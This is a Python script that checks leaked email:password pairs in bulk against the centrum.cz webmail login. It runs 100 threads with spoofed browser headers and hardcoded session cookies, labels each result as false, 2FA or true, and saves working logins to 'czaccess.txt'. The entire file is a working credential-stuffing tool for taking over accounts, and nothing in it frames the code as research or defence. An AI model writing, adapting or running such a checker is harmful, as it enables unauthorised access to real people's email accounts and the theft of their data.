import concurrent.futures
import requests
dem = 0
def check_mail(user, mk):
    global dem
    mail = f'{user}@centrum.cz'
    cookies = {
        'tracking-uid': 'kTJFEewNb',
        'uselastname': '%23_%23false',
        'uprofile': 'patron31%40centrum.cz%7Cpatron31%40centrum.cz%7Ctrue%7C6678371%7C695f109cf773f07190b1c6179f45e55e',
        'mailhttp': '0',
        'eco_check_cookie': '1',
    }
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://user.centrum.cz',
        'Referer': 'https://user.centrum.cz/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
    }
    data = {
        'ego_domain': 'centrum.cz',
        'url': 'https://mail.centrum.cz/',
        'ego_user': mail,
        'ego_secret': mk,
    }
    while True:
      try:
        response = requests.post('https://user.centrum.cz/', cookies=cookies, headers=headers, data=data).text
        if 'auth error' in response or 'nezdařilo.' in response :
          dem += 1
          print(f'\033[1;33mFalse | {mail}:{mk} | {dem}')
          break
        elif 'dvoufaktorové ověření' in response:
          dem += 1
          print(f'\033[1;33m2FA | {mail}:{mk} | {dem}')
          break
        else:
          dem += 1
          print(f'\033[1;32mTrue | {mail}:{mk} | {dem}')
          open('czaccess.txt', 'a').write(f'{mail}:{mk}'+'\n')
          break
      except:
        print(response)
        continue

def process_file(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            futures = []
            for line in lines:
              if ':' in line and '@' in line:
                user = line.strip().split('@')[0]
                mk = line.strip().split(':')[1]
                futures.append(executor.submit(check_mail, user, mk))
              else:
                print(f"Invalid format in line: {line}")

                
            # Wait for all threads to finish
            concurrent.futures.wait(futures)

if __name__ == "__main__":
    file=input('File:')
    process_file(file)
